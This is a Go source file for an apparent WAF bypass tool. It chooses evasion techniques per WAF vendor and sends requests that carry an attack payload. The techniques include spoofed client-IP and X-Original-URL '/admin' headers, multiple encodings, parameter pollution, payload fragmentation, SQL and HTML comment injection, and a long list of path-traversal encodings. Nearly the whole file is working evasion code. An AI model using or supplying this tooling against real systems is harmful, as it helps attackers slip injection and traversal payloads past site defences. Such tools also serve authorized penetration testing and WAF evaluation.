package wafcheck

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// BypassTechnique represents a WAF bypass technique
type BypassTechnique string

// Known bypass techniques
const (
	EncodingBypass      BypassTechnique = "Encoding"
	HeaderManipulation  BypassTechnique = "HeaderManipulation"
	ParameterPollution  BypassTechnique = "ParameterPollution"
	PayloadFragmentation BypassTechnique = "PayloadFragmentation"
	TimingAttack        BypassTechnique = "TimingAttack"
	MethodOverriding    BypassTechnique = "MethodOverriding"
	ContentTypeManipulation BypassTechnique = "ContentTypeManipulation"
	CaseSwitching       BypassTechnique = "CaseSwitching"
	CommentInjection    BypassTechnique = "CommentInjection"
	AlternatePathTraversal BypassTechnique = "AlternatePathTraversal"
	PathMutation        BypassTechnique = "PathMutation"
	RandomUserAgent     BypassTechnique = "RandomUserAgent"
)

// BypassResult contains the result of a bypass attempt
type BypassResult struct {
	Technique      BypassTechnique
	Success        bool
	StatusCode     int
	ResponseLength int
	Request        *http.Request
	Response       *http.Response
	Notes          string
}

// WAFBypasser is the main struct for WAF bypass operations
type WAFBypasser struct {
	httpClient *http.Client
	rnd        *rand.Rand
	useRandomUserAgent bool
	pathMutations      bool
}

// NewBypasser creates a new WAFBypasser instance
func NewBypasser(options ...BypassOption) *WAFBypasser {
	bypasser := &WAFBypasser{
		httpClient: &http.Client{
			Timeout: 15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		rnd: rand.New(rand.NewSource(time.Now().UnixNano())),
		useRandomUserAgent: true,  // Enable by default
		pathMutations: true,       // Enable by default
	}
	
	// Apply options
	for _, option := range options {
		option(bypasser)
	}
	
	return bypasser
}

// BypassOption is a function type for configuring WAFBypasser
type BypassOption func(*WAFBypasser)

// WithRandomUserAgent enables or disables random user agent generation
func WithRandomUserAgent(enable bool) BypassOption {
	return func(b *WAFBypasser) {
		b.useRandomUserAgent = enable
	}
}

// WithPathMutations enables or disables path mutations
func WithPathMutations(enable bool) BypassOption {
	return func(b *WAFBypasser) {
		b.pathMutations = enable
	}
}

// AttemptBypass tries to bypass a WAF using various techniques
func (b *WAFBypasser) AttemptBypass(targetURL string, wafInfo *WAFInfo, payload string) ([]*BypassResult, error) {
	var results []*BypassResult

	// Choose techniques based on the WAF type
	techniques := b.selectTechniquesForWAF(wafInfo.Type)

	// Try each technique
	for _, technique := range techniques {
		result, err := b.executeBypassTechnique(targetURL, technique, payload)
		if err != nil {
			continue
		}
		
		results = append(results, result)
		
		// If we found a successful bypass, return immediately
		if result.Success {
			return results, nil
		}
	}
	
	// If standard techniques didn't work, try path mutations if enabled
	if b.pathMutations {
		pathResults, err := b.attemptPathMutationBypass(targetURL, payload)
		if err == nil {
			results = append(results, pathResults...)
			
			// Check if any path mutation was successful
			for _, result := range pathResults {
				if result.Success {
					return results, nil
				}
			}
		}
	}

	return results, nil
}

// selectTechniquesForWAF selects appropriate bypass techniques for a specific WAF
func (b *WAFBypasser) selectTechniquesForWAF(wafType WAFType) []BypassTechnique {
	// Default techniques to try for any WAF
	defaultTechniques := []BypassTechnique{
		RandomUserAgent,
		EncodingBypass,
		HeaderManipulation,
		ParameterPollution,
		PayloadFragmentation,
		CaseSwitching,
		PathMutation,
	}

	// Add WAF-specific techniques
	switch wafType {
	case Cloudflare:
		return []BypassTechnique{
			EncodingBypass,
			HeaderManipulation,
			ParameterPollution,
			TimingAttack,
			CaseSwitching,
		}
	case Incapsula:
		return []BypassTechnique{
			ParameterPollution,
			HeaderManipulation,
			ContentTypeManipulation,
			PayloadFragmentation,
			CommentInjection,
		}
	case Akamai:
		return []BypassTechnique{
			EncodingBypass,
			MethodOverriding,
			ContentTypeManipulation,
			HeaderManipulation,
			PayloadFragmentation,
		}
	case ModSecurity:
		return []BypassTechnique{
			EncodingBypass,
			CommentInjection,
			AlternatePathTraversal,
			CaseSwitching,
			ParameterPollution,
		}
	default:
		return defaultTechniques
	}
}

// executeBypassTechnique executes a specific bypass technique
func (b *WAFBypasser) executeBypassTechnique(targetURL string, technique BypassTechnique, payload string) (*BypassResult, error) {
	var req *http.Request
	var err error

	switch technique {
	case EncodingBypass:
		req, err = b.createEncodingBypassRequest(targetURL, payload)
	case HeaderManipulation:
		req, err = b.createHeaderManipulationRequest(targetURL, payload)
	case ParameterPollution:
		req, err = b.createParameterPollutionRequest(targetURL, payload)
	case PayloadFragmentation:
		req, err = b.createPayloadFragmentationRequest(targetURL, payload)
	case TimingAttack:
		req, err = b.createTimingAttackRequest(targetURL, payload)
	case MethodOverriding:
		req, err = b.createMethodOverridingRequest(targetURL, payload)
	case ContentTypeManipulation:
		req, err = b.createContentTypeManipulationRequest(targetURL, payload)
	case CaseSwitching:
		req, err = b.createCaseSwitchingRequest(targetURL, payload)
	case CommentInjection:
		req, err = b.createCommentInjectionRequest(targetURL, payload)
	case AlternatePathTraversal:
		req, err = b.createAlternatePathTraversalRequest(targetURL, payload)
	case PathMutation:
		req, err = b.createPathMutationRequest(targetURL, payload)
	case RandomUserAgent:
		req, err = b.createRandomUserAgentRequest(targetURL, payload)
	default:
		return nil, fmt.Errorf("unknown bypass technique: %s", technique)
	}

	if err != nil {
		return nil, err
	}

	// Execute the request
	resp, err := b.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	// Determine if the bypass was successful
	// This is a simplistic approach - in a real-world scenario, you'd need more sophisticated detection
	success := resp.StatusCode != 403 && resp.StatusCode != 406 && resp.StatusCode != 429 && resp.StatusCode != 503

	return &BypassResult{
		Technique:      technique,
		Success:        success,
		StatusCode:     resp.StatusCode,
		ResponseLength: len(body),
		Request:        req,
		Response:       resp,
		Notes:          fmt.Sprintf("Attempted %s bypass, received status code %d", technique, resp.StatusCode),
	}, nil
}

// createEncodingBypassRequest creates a request with encoded payloads
func (b *WAFBypasser) createEncodingBypassRequest(targetURL string, payload string) (*http.Request, error) {
	// Choose a random encoding technique
	encodingTechniques := []func(string) string{
		// URL encoding
		func(p string) string { return url.QueryEscape(p) },
		// Double URL encoding
		func(p string) string { return url.QueryEscape(url.QueryEscape(p)) },
		// Base64 encoding
		func(p string) string { return base64.StdEncoding.EncodeToString([]byte(p)) },
		// Hex encoding
		func(p string) string {
			var result string
			for _, c := range p {
				result += fmt.Sprintf("%%%.2x", c)
			}
			return result
		},
		// Unicode encoding
		func(p string) string {
			var result string
			for _, c := range p {
				result += fmt.Sprintf("\\u%.4x", c)
			}
			return result
		},
	}

	// Apply a random encoding technique
	encodedPayload := encodingTechniques[b.rnd.Intn(len(encodingTechniques))](payload)
	
	// Create the request
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	// Add the encoded payload as a parameter
	q := parsedURL.Query()
	q.Add("param", encodedPayload)
	parsedURL.RawQuery = q.Encode()

	req, err := http.NewRequest("GET", parsedURL.String(), nil)
	if err != nil {
		return nil, err
	}

	// Use random user agent if enabled
	if b.useRandomUserAgent {
		req.Header.Set("User-Agent", GetRandomUserAgent())
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	}
	
	return req, nil
}

// createHeaderManipulationRequest creates a request with manipulated headers
func (b *WAFBypasser) createHeaderManipulationRequest(targetURL string, payload string) (*http.Request, error) {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil, err
	}

	// Add standard headers
	// Use random user agent if enabled
	if b.useRandomUserAgent {
		req.Header.Set("User-Agent", GetRandomUserAgent())
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	}
	
	// Add evasive headers
	evasiveHeaders := []struct {
		name  string
		value string
	}{
		// Basic IP spoofing headers
		{"X-Forwarded-For", "127.0.0.1, 192.168.1.1, 10.0.0.1"},
		{"X-Originating-IP", "[127.0.0.1]"},
		{"X-Remote-IP", "127.0.0.1"},
		{"X-Remote-Addr", "127.0.0.1"},
		{"X-ProxyUser-Ip", "127.0.0.1"},
		{"X-Custom-IP-Authorization", "127.0.0.1"},
		{"X-Real-IP", "127.0.0.1"},
		{"X-Client-IP", "127.0.0.1"},
		{"Client-IP", "127.0.0.1"},
		{"True-Client-IP", "127.0.0.1"},
		{"X-Forward-For", "127.0.0.1"},
		{"X-Originally-Forwarded-For", "127.0.0.1"},
		{"X-Forwarded", "127.0.0.1"},
		{"Forwarded-For", "127.0.0.1"},
		{"Forwarded-For-Ip", "127.0.0.1"},
		{"X-Forwarded-By", "127.0.0.1"},
		{"X-Forwarded-For-Original", "127.0.0.1"},
		{"HTTP-X-Forwarded-For", "127.0.0.1"},
		{"HTTP-Client-IP", "127.0.0.1"},
		{"HTTP-X-Real-IP", "127.0.0.1"},
		{"X-Original-Remote-Addr", "127.0.0.1"},
		{"X-Server-IP", "127.0.0.1"},
		
		// URL manipulation headers
		{"X-Original-URL", "/admin"},
		{"X-Rewrite-URL", "/admin"},
		{"X-Originating-URL", "/admin"},
		{"Request-Uri", "/admin"},
		{"X-Original-URL", "127.0.0.1"},
		{"X-Proxy-URL", "http://127.0.0.1"},
		{"Base-Url", "http://127.0.0.1"},
		{"Proxy-Url", "http://127.0.0.1"},
		
		// Host manipulation headers
		{"X-Host", req.Host},
		{"X-Forwarded-Host", req.Host},
		{"X-Forwarded-Server", "localhost"},
		{"X-Forwarded-Server", "localhost:80"},
		{"X-Host-Name", "localhost"},
		{"X-Original-Host", "localhost"},
		{"Proxy-Host", "localhost"},
		{"X-Backend-Host", "localhost"},
		{"X-Host-Override", "localhost"},
		{"X-Forwarded-Host-Original", "localhost"},
		
		// Protocol and port manipulation
		{"X-Forwarded-Proto", "http://127.0.0.1"},
		{"X-Forwarded-Scheme", "http"},
		{"X-Forwarded-Protocol", "http"},
		{"X-Forwarded-SSL", "off"},
		{"X-Forwarded-Port", "4443"},
		{"X-Forwarded-Port", "80"},
		{"X-Forwarded-Port", "7080"},
		{"X-Forwarded-Port", "8443"},
		{"X-Client-Port", "443"},
		{"X-Remote-Port", "443"},
		
		// Method override
		{"X-HTTP-Method-Override", "GET"},
		
		// Misc headers
		{"X-WAP-Profile", "127.0.0.1"},
		{"X-Arbitrary", "http://127.0.0.1"},
		{"X-HTTP-DestinationURL", "http://127.0.0.1"},
		{"Destination", "127.0.0.1"},
		{"X-Pwnage", "127.0.0.1"},
		{"X-Bypass", "127.0.0.1"},
		{"Content-Length", "0"},
		{"X-WAF-Bypass", "true"},
	}

	// Add a subset of evasive headers
	numHeaders := 3 + b.rnd.Intn(5) // Add between 3 and 7 headers
	for i := 0; i < numHeaders; i++ {
		header := evasiveHeaders[b.rnd.Intn(len(evasiveHeaders))]
		req.Header.Set(header.name, header.value)
	}

	// Add the payload in a custom header
	req.Header.Set("X-Payload", payload)

	return req, nil
}

// createParameterPollutionRequest creates a request with parameter pollution
func (b *WAFBypasser) createParameterPollutionRequest(targetURL string, payload string) (*http.Request, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	// Add multiple instances of the same parameter with different values
	q := parsedURL.Query()
	paramName := "id"
	
	// Add legitimate-looking values
	q.Add(paramName, "1")
	q.Add(paramName, "test")
	
	// Add the payload
	q.Add(paramName, payload)
	
	// Add more legitimate-looking values
	q.Add(paramName, "end")
	
	// Add variations of the parameter name
	variations := []string{
		paramName + "[]",
		paramName + "[0]",
		paramName + ".0",
		paramName + "%00",
		paramName + ".",
		paramName + "_",
		paramName + "-",
	}
	
	for _, v := range variations {
		q.Add(v, payload)
	}
	
	parsedURL.RawQuery = q.Encode()
	
	req, err := http.NewRequest("GET", parsedURL.String(), nil)
	if err != nil {
		return nil, err
	}
	
	// Use random user agent if enabled
	if b.useRandomUserAgent {
		req.Header.Set("User-Agent", GetRandomUserAgent())
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	}
	
	return req, nil
}

// createPayloadFragmentationRequest creates a request with fragmented payload
func (b *WAFBypasser) createPayloadFragmentationRequest(targetURL string, payload string) (*http.Request, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	// Fragment the payload across multiple parameters
	if len(payload) < 3 {
		return nil, fmt.Errorf("payload too short to fragment")
	}
	
	// Split the payload into parts
	fragmentCount := 2 + b.rnd.Intn(3) // 2-4 fragments
	fragmentSize := len(payload) / fragmentCount
	
	q := parsedURL.Query()
	
	for i := 0; i < fragmentCount; i++ {
		start := i * fragmentSize
		end := start + fragmentSize
		if i == fragmentCount-1 {
			end = len(payload) // Make sure the last fragment gets the remainder
		}
		
		if start >= len(payload) {
			break
		}
		
		fragment := payload[start:end]
		q.Add(fmt.Sprintf("p%d", i+1), fragment)
	}
	
	parsedURL.RawQuery = q.Encode()
	
	req, err := http.NewRequest("GET", parsedURL.String(), nil)
	if err != nil {
		return nil, err
	}
	
	// Use random user agent if enabled
	if b.useRandomUserAgent {
		req.Header.Set("User-Agent", GetRandomUserAgent())
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	}
	
	return req, nil
}

// createTimingAttackRequest creates a request with timing variations
func (b *WAFBypasser) createTimingAttackRequest(targetURL string, payload string) (*http.Request, error) {
	// This is a simplified version - in a real implementation, you would implement more sophisticated timing attacks
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil, err
	}
	
	// Add a custom header with the payload
	req.Header.Set("X-Payload", payload)
	
	// Set a custom client with a longer timeout
	b.httpClient.Timeout = 30 * time.Second
	
	return req, nil
}

// createMethodOverridingRequest creates a request with method overriding
func (b *WAFBypasser) createMethodOverridingRequest(targetURL string, payload string) (*http.Request, error) {
	// Create a POST request but override it to be treated as GET
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(payload))
	if err != nil {
		return nil, err
	}
	
	// Add method override headers
	methodOverrideHeaders := []struct {
		name  string
		value string
	}{
		{"X-HTTP-Method", "GET"},
		{"X-HTTP-Method-Override", "GET"},
		{"X-Method-Override", "GET"},
		{"_method", "GET"},
	}
	
	// Add a random method override header
	header := methodOverrideHeaders[b.rnd.Intn(len(methodOverrideHeaders))]
	req.Header.Set(header.name, header.value)
	
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// Use random user agent if enabled
	if b.useRandomUserAgent {
		req.Header.Set("User-Agent", GetRandomUserAgent())
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	}
	
	return req, nil
}

// createContentTypeManipulationRequest creates a request with manipulated content type
func (b *WAFBypasser) createContentTypeManipulationRequest(targetURL string, payload string) (*http.Request, error) {
	// Create a POST request with the payload
	req, err := http.NewRequest("POST", targetURL, bytes.NewBufferString(payload))
	if err != nil {
		return nil, err
	}
	
	// Use an unusual or mixed content type
	contentTypes := []string{
		"application/x-www-form-urlencoded; charset=UTF-8",
		"application/json; charset=UTF-8",
		"text/xml; charset=UTF-8",
		"multipart/form-data; boundary=---------------------------7051914041544843365972754266",
		"text/plain; charset=UTF-8",
		"application/x-www-form-urlencoded; charset=ISO-8859-1",
		"application/xml; charset=UTF-8",
		"application/soap+xml; charset=UTF-8",
	}
	
	req.Header.Set("Content-Type", contentTypes[b.rnd.Intn(len(contentTypes))])
	// Use random user agent if enabled
	if b.useRandomUserAgent {
		req.Header.Set("User-Agent", GetRandomUserAgent())
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	}
	
	return req, nil
}

// createCaseSwitchingRequest creates a request with case variations
func (b *WAFBypasser) createCaseSwitchingRequest(targetURL string, payload string) (*http.Request, error) {
	// Apply random case switching to the payload
	var caseSwitchedPayload strings.Builder
	
	for _, c := range payload {
		if b.rnd.Intn(2) == 0 {
			caseSwitchedPayload.WriteRune(c)
		} else {
			// Try to switch case if it's a letter
			if 'a' <= c && c <= 'z' {
				caseSwitchedPayload.WriteRune(c - 'a' + 'A')
			} else if 'A' <= c && c <= 'Z' {
				caseSwitchedPayload.WriteRune(c - 'A' + 'a')
			} else {
				caseSwitchedPayload.WriteRune(c)
			}
		}
	}
	
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}
	
	// Add the case-switched payload as a parameter
	q := parsedURL.Query()
	q.Add("param", caseSwitchedPayload.String())
	parsedURL.RawQuery = q.Encode()
	
	req, err := http.NewRequest("GET", parsedURL.String(), nil)
	if err != nil {
		return nil, err
	}
	
	// Use random user agent if enabled
	if b.useRandomUserAgent {
		req.Header.Set("User-Agent", GetRandomUserAgent())
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	}
	
	return req, nil
}

// createCommentInjectionRequest creates a request with comments injected into the payload
func (b *WAFBypasser) createCommentInjectionRequest(targetURL string, payload string) (*http.Request, error) {
	// Inject comments into the payload based on the type of payload
	var commentedPayload string
	
	if strings.Contains(payload, "'") || strings.Contains(payload, "\"") {
		// SQL-like payload, inject SQL comments
		parts := strings.Split(payload, " ")
		var newParts []string
		
		for _, part := range parts {
			newParts = append(newParts, part)
			if b.rnd.Intn(2) == 0 {
				newParts = append(newParts, "/**/")
			}
		}
		
		commentedPayload = strings.Join(newParts, " ")
	} else if strings.Contains(payload, "<") || strings.Contains(payload, ">") {
		// HTML-like payload, inject HTML comments
		parts := strings.Split(payload, "><")
		var newParts []string
		
		for i, part := range parts {
			if i == 0 {
				newParts = append(newParts, part+">")
			} else if i == len(parts)-1 {
				newParts = append(newParts, "<"+part)
			} else {
				newParts = append(newParts, "<"+part+">")
			}
			
			if b.rnd.Intn(2) == 0 {
				newParts = append(newParts, "<!-- -->")
			}
		}
		
		commentedPayload = strings.Join(newParts, "")
	} else {
		// Generic payload, just add some whitespace
		parts := strings.Split(payload, "")
		var newParts []string
		
		for _, part := range parts {
			newParts = append(newParts, part)
			if b.rnd.Intn(3) == 0 {
				newParts = append(newParts, " ")
			}
		}
		
		commentedPayload = strings.Join(newParts, "")
	}
	
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}
	
	// Add the commented payload as a parameter
	q := parsedURL.Query()
	q.Add("param", commentedPayload)
	parsedURL.RawQuery = q.Encode()
	
	req, err := http.NewRequest("GET", parsedURL.String(), nil)
	if err != nil {
		return nil, err
	}
	
	// Use random user agent if enabled
	if b.useRandomUserAgent {
		req.Header.Set("User-Agent", GetRandomUserAgent())
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	}
	
	return req, nil
}

// createAlternatePathTraversalRequest creates a request with alternate path traversal techniques
func (b *WAFBypasser) createAlternatePathTraversalRequest(targetURL string, payload string) (*http.Request, error) {
	// This is specifically for path traversal payloads
	if !strings.Contains(payload, "../") && !strings.Contains(payload, "..\\") {
		return nil, fmt.Errorf("payload is not a path traversal attack")
	}
	
	// Create variations of path traversal
	pathTraversalVariations := []string{
		"..%2f",
		"..%252f",
		"%2e%2e/",
		"%2e%2e%2f",
		"..%c0%af",
		"..%ef%bc%8f",
		"..\\",
		"..%5c",
		"..%255c",
		"%2e%2e\\",
		"%2e%2e%5c",
		"..%c1%9c",
		"/%25e",
		"/%2e%2e/",
		"/%2e%2e%2f/",
		"/..%00/",
		"/..%01/",
		"/..//",
		"/..\\/",
		"/%5C../",
		"/%2e%2e\\",
		"/..%255c",
		"/..%255c..%255c",
		"/..%5c..%5c",
		"/.%252e/",
		"/%252e/",
		"/..%c0%af",
		"/..%c1%9c",
		"/%%32%65",
		"/%%32%65/",
		"/..%bg%qf",
		"/..%u2215",
		"/..%u2216",
		"/..0x2f",
		"/0x2e0x2e/",
		"/..%c0%ae%c0%ae/",
		"/%%c0%ae%%c0%ae/",
		"/%%32%%65%%32%%65/",
		"/%25e",
		"/.",
		"//",
		"/.//./",
		"/.;",
		"/%20",
		"/../",
		"/%%\\x09",
		"/%20",
		"/%%20",
		"/%%23%%3f",
		"/%%252f%%252f",
		"/%%252f/",
		"/%%%%2e%%%%2e",
		"/%%%%2e%%%%2e/",
		"/%%%%2f",
		"/%%%%2f%%%%20%%%%23",
		"/",
		"/%25e",
		"//.",
		"////",
		"/.//./",
		"/.;/",
		"/%20",
		"/../",
		"/%%\\x09",
		"/%20",
		"/%%%%20",
		"/%%%%23%%%%3f",
		"/%%%%252f%%%%252f",
		"/%%%%252f/",
		"/%%%%2e%%%%2e",
		"/%%%%2e%%%%2e/",
	}
	
	// Replace "../" with a random variation
	variation := pathTraversalVariations[b.rnd.Intn(len(pathTraversalVariations))]
	altPayload := strings.ReplaceAll(payload, "../", variation)
	
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}
	
	// Add the alternate path traversal payload as a parameter
	q := parsedURL.Query()
	q.Add("path", altPayload)
	parsedURL.RawQuery = q.Encode()
	
	req, err := http.NewRequest("GET", parsedURL.String(), nil)
	if err != nil {
		return nil, err
	}
	
	// Use random user agent if enabled
	if b.useRandomUserAgent {
		req.Header.Set("User-Agent", GetRandomUserAgent())
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	}
	
	return req, nil
}
